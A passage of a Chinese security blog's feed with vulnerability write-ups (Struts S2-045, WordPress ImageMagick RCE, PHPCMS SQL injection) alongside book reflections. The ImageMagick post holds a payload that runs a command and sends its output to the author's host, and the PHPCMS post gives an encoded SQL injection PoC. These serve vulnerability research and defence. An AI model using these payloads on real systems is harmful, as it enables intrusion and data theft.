            &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;expressions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Ognl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseExpression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;checkEnableEvalExpression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Ognl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseExpression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;checkEnableEvalExpression&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tree&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;首先通过expressions.get(expression)来尝试解析表达式，如果表达式只是单条语句，那么tree变量就必然非空，否则tree变量为空需要经过checkEnableEvalExpression方法检验。通过上面compare的图，可以看出这个流程多了一个isSequence方法，这个方法判断OnglContext中的语句是否为队列（多条语句），如果是那么返回false。也就是说，如果经过OgnlUtil类getvalue方法的ognl表达式是多语句形式的，那么一定会拒绝执行。&lt;/p&gt;

&lt;p&gt;而网上流传的这段PoC对防护有着惊艳的表现，它通过使用Ognl提供的子表达式的语法，将多条语句合成了一条语句，完美bypass掉了if(tree == null)中的校验。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2017-03/subexpression.png&quot; alt=&quot;subexpression&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x03-总结&quot;&gt;0x03 总结&lt;/h2&gt;

&lt;p&gt;关于FileUploadInterceptor我也多次有跟踪，想从其中找到利用点，不过却忽略了JakartaMultiPartRequest中的调试，与一个历史级的漏洞失之交臂，惋惜至极。漏洞的挖掘就是需要一个死角也不放过的较真，否则也就像我这样空叹曾经路过。。。&lt;/p&gt;

&lt;p&gt;安恒的小哥能发现这个漏洞也是必然，毕竟他对于Struts的每个更新版本和细节都会认真研究（就像S2-032这个原先没有漏洞，后来版本更新导致的漏洞），我这样的懒人在他面前实在是汗颜。哦，对了，还有他的这个PoC实现思路实在是让我叹为观止，我是服了~~&lt;/p&gt;

&lt;h2 id=&quot;0x04-参考文章&quot;&gt;0x04 参考文章&lt;/h2&gt;

&lt;p&gt;【1】&lt;a href=&quot;http://blog.csdn.net/u011721501/article/details/60768657&quot;&gt;s2-045漏洞分析（隐形人真忙）&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;【2】&lt;a href=&quot;http://paper.seebug.org/247/&quot;&gt;S2-045 漏洞分析&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;【3】&lt;a href=&quot;http://paper.seebug.org/241/&quot;&gt;《S2-045 原理初步分析（CVE-2017-5638）》&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;【4】&lt;a href=&quot;https://commons.apache.org/proper/commons-ognl/language-guide.html&quot;&gt;OGNL语法表&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;【4】&lt;a href=&quot;https://github.com/apache/struts/commit/c48007cccc4a8007005eec782902c1f38e683438#diff-72e88cf125a077f6fb215a2e4cf3eb40L295&quot;&gt;Struts2.3.28与2.3.28.1的代码对比&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>读《千年悖论——张宏杰读史与论人》有感</title>
   <link href="http://localhost:4000/%E8%AF%BB%E4%B9%A6/2017/03/01/%E8%AF%BB-%E5%8D%83%E5%B9%B4%E6%82%96%E8%AE%BA-%E5%BC%A0%E5%AE%8F%E6%9D%B0%E8%AF%BB%E5%8F%B2%E4%B8%8E%E8%AE%BA%E4%BA%BA-%E6%9C%89%E6%84%9F.html"/>
   <updated>2017-03-01T02:04:34+08:00</updated>
   <id>http://localhost:4000/%E8%AF%BB%E4%B9%A6/2017/03/01/读《千年悖论——张宏杰读史与论人》有感</id>
   <content type="html">&lt;p&gt;&lt;img src=&quot;/assets/images/2017-03/01.jpg&quot; alt=&quot;题图&quot; /&gt;&lt;/p&gt;

&lt;p&gt;赋闲在家读张宏杰的《千年悖论——张宏杰读史与论人》，感慨颇多。古代中国朝代更替之间的英雄和奸佞似乎都是悲哀的，他们置身于时代更替的浪潮中不能自已，从他们自身的立场来看他们的选择都是合情合理的，可悲的是历史却从不是从事实和人性的角度来书写。&lt;/p&gt;

&lt;p&gt;吴三桂，一个孝勇的将军，一个道德的楷模，一个前途坦荡情商极高的青年才俊，本该一片坦途，光宗耀祖，像他想象中的那样，却被时代开了一个无情的玩笑——侍奉腐朽的即将凋零的大明王朝。一个前半生都在追寻的目标，在而立之年发现这个目标总是得到也不过如昙花一现，随大明王朝而去，而自己也许享受不到这个目标给自己带来的一切。他之后所做的一切也不过是想达成他前半生的目标，可惜中国自古帝王为方便统治而实行的道德标准不允许人性的出现。即使是外族满人，在习得了中国传统文化之后也不过是将他当做一个贰臣看待。&lt;/p&gt;

&lt;p&gt;曾国藩，最后一个儒家的殉道者，以儒家之精要训练己身，终生自省，成就不可谓之不大。但到晚年方才发现，自己毕生所追寻的儒家圣人之路并非济世良药，纵使成为圣人也不撼动不了这滚滚而来的历史车轮，不可为之不悲。&lt;/p&gt;

&lt;p&gt;袁世凯，一个极度崇洋媚外，却又信奉自身成功经验的人。只羡民主政治之皮毛，却无心理解其内里；只知变革带来的混沌，却无心感受其中蕴含的生机；只求方法的快速见效，却无心等待沉淀的力量。&lt;/p&gt;

&lt;p&gt;以上三者无一不为惊世之奇才，自身却深陷时代的泥淖与中华千年文明的桎梏。中国因统一而先进，也因统一而落后。若不统一，也不会有这千年统治者驭民之法的沉淀，也就不会有独尊儒术，唯科举变命论，这三人的命运也许不会如现在这番难看，古代中国之人也不会因为权利的争夺而多灾多难，近代国人也不会因为经多了灾难而变得麻木，现在的人也不会由于千年的道德压迫变得毫无原则。&lt;/p&gt;

&lt;p&gt;说起科举制度，在这本书中也有所描述，这一创造性的发明是古代中国走在世界前沿的基石，也是导致古代中国朝代更替这一怪圈的基石。数学历史上都有以简单为美的追求，发展至现在，人们不由得怀疑到底真的是简单最美，还是因为人无法理解复杂的事物，所以才追求简单之美。科举制度导致的怪圈，如果这种化繁为简的思维方式来看，似乎就容易理解了，因为要化繁为简，所以古代统治者要去除社会的多元化，因此古代中国只有通过科举考取功名这一光宗耀祖的途径。从而导致古代中国举国之人才全部投身于比中彩票概率还低的科举当中。是的！就是中彩票，试想一下如果现在举国人民都投身于彩票事业，是一个多么荒谬可笑的事情，而这个事情在古代中国却持续了千年之久。&lt;/p&gt;

&lt;p&gt;世界变化如同一张恢弘大气的棋盘，我们所经历的不过是棋盘上小小的一处局部，身处局部之中的我们无法察觉全局的发展，而历史可以让我们略窥大局的发展，却也仅仅只是略窥。我等中华子民是该因这千年统一带来的文明深感幸运和自豪，还是该感慨这千年玩笑的悲哀，现在在略窥这大局的走向之后更加的说不清了。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Wordpress ImageMagic漏洞测试环境搭建&amp;利用的心路历程</title>
   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2016/06/17/Wordpress+ImageMagic%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%88%A9%E7%94%A8%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B.html"/>
   <updated>2016-06-17T17:33:02+08:00</updated>
   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2016/06/17/Wordpress+ImageMagic漏洞测试环境搭建利用的心路历程</id>
   <content type="html">&lt;p&gt;最近工作上的原因需要搭建一个Wordpress的ImageMagic漏洞环境，搭建过程中遇到了一些头疼的问题，以及对于利用方法的一些思考，在这里总结一下。&lt;/p&gt;

&lt;h2 id=&quot;环境搭建&quot;&gt;环境搭建&lt;/h2&gt;

&lt;p&gt;我使用的是Ubuntu14.04 64位版，使用Ngnix+php5fmp+mysql搭建，Wordpress版本选择的是4.5.1。服务配置这里没什么说的，我们直接来看搭建需要注意的地方。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;首先Wordpress需要关闭掉自动升级功能，否则被修复到无漏洞版本就尴尬了。在wp-confing.php文件最后添加如下一行代码，然后安装即可。&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;define('AUTOMATIC_UPDATER_DISABLED',true);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;后面就是ImageMagic的安装了，Ubuntu默认源中是修复了的版本，所以我们只能去找源码编译。找到合适的源码也是一件很蛋疼的事情，我最后是在&lt;a href=&quot;http://www.imagemagick.org/download/releases/&quot;&gt;http://www.imagemagick.org/download/releases/&lt;/a&gt;这里找到的版本，不过这里面有的版本在我的环境中编译总是会报错，最终我编译成功的是6.9.0.0这个版本。编译命令如下，需注意要指定一个明确的路径，以便于之后编译php的imagick插件时提供。&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure --prefix&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/imagemagick
make
make install
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;之后下载php的imagick插件源码编译，这里我选择的是3.4.1版本，操作如下：&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://pecl.php.net/get/imagick-3.4.1.tgz
tar -zxvf imagick-3.4.1.tgz 
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;imagick-3.4.1/
phpize
./configure --prefix&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/imagick --with-php-config&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/bin/php-config  --with-imagick&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/imagemagick
make
make install
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;在php.ini中添加插件so重启php5fpm即可。phpinfo如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2016-06/06-17-phpinfo.png&quot; alt=&quot;phpinfo&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;wordpress-imagemagic漏洞利用&quot;&gt;Wordpress ImageMagic漏洞利用&lt;/h2&gt;

&lt;p&gt;在阅读ricter师傅的&lt;a href=&quot;http://ricterz.me/posts/Write%20Up%3A%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1?_=1466130906033&quot;&gt;文章&lt;/a&gt;时，自己的理解有些问题，没太搞懂_ajax_nonce的意思，导致在测试漏洞时大部分时间用来找_ajax_nonce了。&lt;/p&gt;

&lt;p&gt;通过作者或以上权限，提交一篇文章，并上传一张正常图片，通过编辑图片的功能可以获取该图片的postid，然后上传内容为以下内容的png图片，同样通过编辑图片功能可以获取该图片的postid和_ajax_nonce。&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg&quot;|php -r &quot;file_get_contents(\&quot;http://172.16.107.144/\&quot;.system(\&quot;pwd\&quot;));)'
pop graphic-context
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;这里关于_ajax_nonce的值，我翻看了一下代码，只要我们找到任意的image_editor这个action和恶意图片postid的_ajax_nonce就可以，因为他后台处理只用了这两个值。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2016-06/06-17-nonce.png&quot; alt=&quot;nonce&quot; /&gt;&lt;/p&gt;

&lt;p&gt;然后抓取正常图片任意编辑操作的提交（一般都是imgedit-preview的action），修改_ajax_nonce和post_id为攻击内图片，即可触发漏洞利用。&lt;/p&gt;

&lt;p&gt;因为这个漏洞没有回显，所以一遍使用直接反弹shell的方法获取交互，但是由于反弹不是很稳定，这里建议使用上面恶意图片内容中给出的php执行访问自己网站并查看日志的方法来实现简单的交互。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>PHPCMS用户登陆SQL注入漏洞分析</title>
   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2015/07/21/PHPCMS%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html"/>
   <updated>2015-07-21T18:06:23+08:00</updated>
   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2015/07/21/PHPCMS用户登陆SQL注入漏洞分析</id>
   <content type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;0x00 简述&lt;/h2&gt;

&lt;p&gt;之前manning在调漏洞的时候，突然发现正常登陆不上去了，当时帮忙跟了下phpcms的登陆流程。之后感觉这个流程貌似有些问题，就仔细看了下，没想到真是一个0day~~&lt;/p&gt;

&lt;h2 id=&quot;0x01-漏洞原理&quot;&gt;0x01 漏洞原理&lt;/h2&gt;

&lt;p&gt;我们先直接看这个漏洞最根源的地方，phpsso/index.php文件所有的操作都存在严重的注入问题，这个类文件的构造函数最先调用它的父构造函数，通过auth_key来解析POST传入的data内容，解析后data中的内容会作为注册、登陆、删除用户等操作的内容依据，而这些操作都会将这些数据作为数据库查询语句使用。这个问题其实在XXX的《PHPCMS V9 最新版本配置文件未授权访问读取》中已经体现出来了，不过他仅仅只是分析了信息泄露的问题，而忽略的他利用所使用的注入问题。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;我们以phpsso的login流程为例来看这个问题，先看phpsso的解析数据部分的代码：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;		if(isset($_POST['appid'])) {
			$this-&amp;gt;appid = intval($_POST['appid']);
		} else {
			exit('0');
		}


		if(isset($_POST['data'])) {
			parse_str(sys_auth($_POST['data'], 'DECODE', $this-&amp;gt;applist[$this-&amp;gt;appid]['authkey']), $this-&amp;gt;data);
			if(empty($this-&amp;gt;data) || !is_array($this-&amp;gt;data)) {
				exit('0');
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;在auth_key解码之后使用parse_str解析成数组格式，这段代码如果在php5.3之前的情况下是没有问题的，因为默认情况下parse_str会启动gpc机制对特殊字符进行转义。但是在php5.3之后gpc机制默认就关闭掉了，这就导致如果解析出来的内容如果带有单引号这类个特殊字符，就原封不动的放到的变量中，这导致了注入的风险。下面我们简单来看一下login行为的代码：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	public function login() {
		$this-&amp;gt;password = isset($this-&amp;gt;data['password']) ? $this-&amp;gt;data['password'] : '';
		$this-&amp;gt;email = isset($this-&amp;gt;data['email']) ? $this-&amp;gt;data['email'] : '';
		if($this-&amp;gt;email) {
			$userinfo = $this-&amp;gt;db-&amp;gt;get_one(array('email'=&amp;gt;$this-&amp;gt;email));
		} else {
			$userinfo = $this-&amp;gt;db-&amp;gt;get_one(array('username'=&amp;gt;$this-&amp;gt;username));
		}
		
		if ($this-&amp;gt;config['ucuse']) {
			pc_base::load_config('uc_config');
			require_once PHPCMS_PATH.'api/uc_client/client.php';
			list($uid, $uc['username'], $uc['password'], $uc['email']) = uc_user_login($this-&amp;gt;username, $this-&amp;gt;password, 0);
		}
		
		if($userinfo) {
			//ucenter登陆部份
			if ($this-&amp;gt;config['ucuse']) {
				if($uid == -1) {	//uc不存在该用户，调用注册接口注册用户
					$uid = uc_user_register($this-&amp;gt;username , $this-&amp;gt;password, $userinfo['email'], $userinfo['random']);
					if($uid &amp;gt;0) {
						$this-&amp;gt;db-&amp;gt;update(array('ucuserid'=&amp;gt;$uid), array('username'=&amp;gt;$this-&amp;gt;username));
					}
				}
			}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;所有$this-&amp;gt;data的内容没有经过任何处理就直接参数到数据库查询当中，如果我们有auth_key的话，完全可以构造带有恶意的内容提交造成SQL注入漏洞。那么如果没有auth_key怎么办呢？我们可以让使用auth_key的页面帮我们编码，甚至帮助我们提交。因此下面这个看似无关紧要的问题，就成了导致注入必不可少的一步。&lt;/p&gt;

&lt;p&gt;说了这么多，终于可以开始入正题了。我们来跟一下登陆的流程，先看member/index.php文件中的login方法:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;			$username = isset($_POST['username']) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; is_username($_POST['username']) ? trim($_POST['username']) : showmessage(L('username_empty'), HTTP_REFERER);
			$password = isset($_POST['password']) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; trim($_POST['password']) ? trim($_POST['password']) : showmessage(L('password_empty'), HTTP_REFERER);
			$cookietime = intval($_POST['cookietime']);
			$synloginstr = ''; //同步登陆js代码
			
			if(pc_base::load_config('system', 'phpsso')) {
				$this-&amp;gt;_init_phpsso();
				$status = $this-&amp;gt;client-&amp;gt;ps_member_login($username, $password);
				$memberinfo = unserialize($status);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;通过这段代码我们需要注意到三个地方，首先是username使用的is_username进行了过滤而password没有做任何处理，然后通过client的ps_member_login方法获取一段数据。最需要关注的是最后一个地方，之后所有操作的内容就完全使用的返回的这套数据。&lt;/p&gt;

&lt;p&gt;下面我们继续来看ps_member_login这个方法的代码：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public function ps_member_login($username, $password, $isemail=0) {
		if($isemail) {
			if(!$this-&amp;gt;_is_email($username)) {
				return -3;
			}
			$return = $this-&amp;gt;_ps_send('login', array('email'=&amp;gt;$username, 'password'=&amp;gt;$password));
		} else {
			$return = $this-&amp;gt;_ps_send('login', array('username'=&amp;gt;$username, 'password'=&amp;gt;$password));
		}
		return $return;
	}

private function _ps_send($action, $data = null) {
 		return $this-&amp;gt;_ps_post($this-&amp;gt;ps_api_url.&quot;/index.php?m=phpsso&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;c=index&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;a=&quot;.$action, 500000, $this-&amp;gt;auth_data($data));
	}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;可以看出使用_ps_post这个方法向phpsso机制的请求login行为，也就是说member的认证其实是有phpsso来完成的。而phpsso的认证数据是需要auth_key编码的，那么这个过程就很直接的呈现在我们眼前：登录用户提交用户名和密码给menber的login，然后member的login通过ps_member_login构造发送phpsso请求login验证的http包，并且将用户名和密码使用auth_key进行编码，作为http包的post数据，phpsso认证完成后，将用户的信息返回给member的login进行后续处理。&lt;/p&gt;

&lt;p&gt;上面的这个过程中我们需要牢记的一点，就是password没有做任何处理。带着这一点，我们再回头看phpsso的login注入问题点，就可以很明确的发现通过password能够造成注入问题。&lt;/p&gt;

&lt;p&gt;我们在这里简单总结下漏洞原因，首先member的login没有对password做过滤便带入到phpsso的login中进行验证，然后phpsso没有对于解码数据进行过滤，从而导致SQL注入。&lt;/p&gt;

&lt;h2 id=&quot;0x02-漏洞利用&quot;&gt;0x02 漏洞利用&lt;/h2&gt;

&lt;p&gt;password字段如果存在特殊字符，在传入到程序时仍然会被转义，而且在phpsso的login中使用的是username做数据库查询，而不是password。&lt;/p&gt;

&lt;p&gt;针对第一个问题我们可以使用二次url编码的方法来搞定，在解码之后程序还是用了parse_str对字符串进行了拆解，而这个函数还附带了解url编码的功能。所以，我们只需要在传password内容时传递%2527就可以让单引号出现在phpsso的变量中了。&lt;/p&gt;

&lt;p&gt;第二个问题也用到parse_str的功能，parse_str在解析“username=123&amp;amp;password=456”这样的字符串，会把它解析为：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Array(
    username=&amp;gt;123,
    password=&amp;gt;456
)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;那么如果被解析字符串变成“usernamen=123&amp;amp;password=456&amp;amp;username=789”，他就会被解析为：&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Array(
    username=&amp;gt;789,
    password=&amp;gt;456
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;那这样我们的利用思路就有了：将”&amp;amp;username=”进行url编码后作为password的值用于在phpsso中覆盖之前的username值，在“&amp;amp;username=”后面添加进行两次url编码的SQL语句，构造出来的POST数据如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;usernmae=phpcms&amp;amp;password=%26username%3d%2527
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;0x03-进阶利用&quot;&gt;0x03 进阶利用&lt;/h2&gt;

&lt;p&gt;按照上一小节的步骤我们可以获得到一个盲注点，但是感觉有些鸡肋。不过当我再回头看member的login流程的最后一步时，想到了一个有趣的进阶利用方法，就是利用注入来构造注入，我个这种方法起名字叫注入接力（和二次注入稍有不同）。&lt;/p&gt;

&lt;p&gt;前文我们提到了member的login再从phpsso获取数据后，所有的操作都使用的是这些数据。那么如果我们结合之前的SQL注入，返回一段带有SQL注入语句的数据，不就可以造成再一次的注入吗。&lt;/p&gt;

&lt;p&gt;不过这里有一个地方需要注意，就是在/phpsso_server/phpcms/modules/phpsso/index.php的login中结尾会使用uid更新登陆信息，所以为了可以实现在member的login中注入不能把注入语句写到uid中。&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;		if(!empty($userinfo) &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $userinfo['password'] == create_password($this-&amp;gt;password, $userinfo['random'])) {
			//登录成功更新用户最近登录时间和ip
			$this-&amp;gt;db-&amp;gt;update(array('lastdate'=&amp;gt;SYS_TIME, 'lastip'=&amp;gt;ip()), array('uid'=&amp;gt;$userinfo['uid']));
			exit(serialize($userinfo));
		}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;由于这个问题我们不能在member的login中的第一个getone查询中进行注入，只好退而求其次，在之后的insert中实现注入攻击。&lt;/p&gt;

&lt;p&gt;测试poc原文如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username=phpcms&amp;amp;password=123456&amp;amp;username=' union select '2','test\',updatexml(1,concat(0x5e24,(select user()),0x5e24),1),\'123456\',\'\',\'\',\'\',\'\',\'\',\'2\',\'10\'),(\'2\',\'test','5f1d7a84db00d2fce00b31a7fc73224f','123456',null,null,null,null,null,null,null,null,null#

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;编码后内容如下：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
username=phpcms&amp;amp;password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;效果如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2015-07/2015-07-21-poc.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x04-总结&quot;&gt;0x04 总结&lt;/h2&gt;

&lt;p&gt;这个漏洞分析中，最大的收获是用到漏洞接力这种利用思路来完成由盲注到可报错注入的华丽转身。&lt;/p&gt;

&lt;h3 id=&quot;漏洞小结&quot;&gt;漏洞小结&lt;/h3&gt;

&lt;p&gt;影响范围个人评价为“高”，PHPCMS在国内的使用范围非常广，而且此漏洞影响PHPCMS目前主流的V9版本，虽然收到PHP的版本影响，但是目前大多数的服务都已经开始更换PHP版本，所以影响范围还是很广的。&lt;/p&gt;

&lt;p&gt;危害性个人评价为“高”，此漏洞只需要可以访问目标网站便可以实现攻击，获取数据库信息，并有很大的可能getshell。&lt;/p&gt;

&lt;h3 id=&quot;防护方案&quot;&gt;防护方案&lt;/h3&gt;

&lt;p&gt;针对phpsso模块添加过滤代码，最好的方式应该是将转义和过滤放在数据库操作的前一步，这样可以极有效缓解SQL注入带来的问题。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>社交网络需要什么？——《失控》读书笔记一</title>
   <link href="http://localhost:4000/%E8%AF%BB%E4%B9%A6/2015/04/26/%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%BB%9C%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88-%E5%A4%B1%E6%8E%A7-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%80.html"/>
   <updated>2015-04-26T13:21:59+08:00</updated>
   <id>http://localhost:4000/%E8%AF%BB%E4%B9%A6/2015/04/26/社交网络需要什么？——《失控》读书笔记一</id>
   <content type="html">&lt;blockquote&gt;
  &lt;p&gt;网络逻辑是违反直觉的。比如说，你要铺设连接一些城市的电话电缆。以堪萨斯城、圣地亚哥和西雅图这三个城市为例，链接这三座城市的电话总长为三千英里。根据常识，如果要在电话网络中加上第四个城市，那么电话下的总长度就必然将增加。然而，网络逻辑给出的答案截然相反。如果将第四个城市作为中心（让我们以盐湖城为例），其他城市通过盐湖城相连，电缆总厂就可以减少2850英里，比原来的三千英里减少了5%。由此，网络的总展开长度在增加节点后反而得以缩短！不过，这种效果是有限的。1990年在贝尔实验室工作的黄光明教授和堵丁柱证明，通过向网络引入新的节点，系统所能够获得的最大节省大约为13%左右。在网络中，更多代表了不同的含义。&lt;/p&gt;

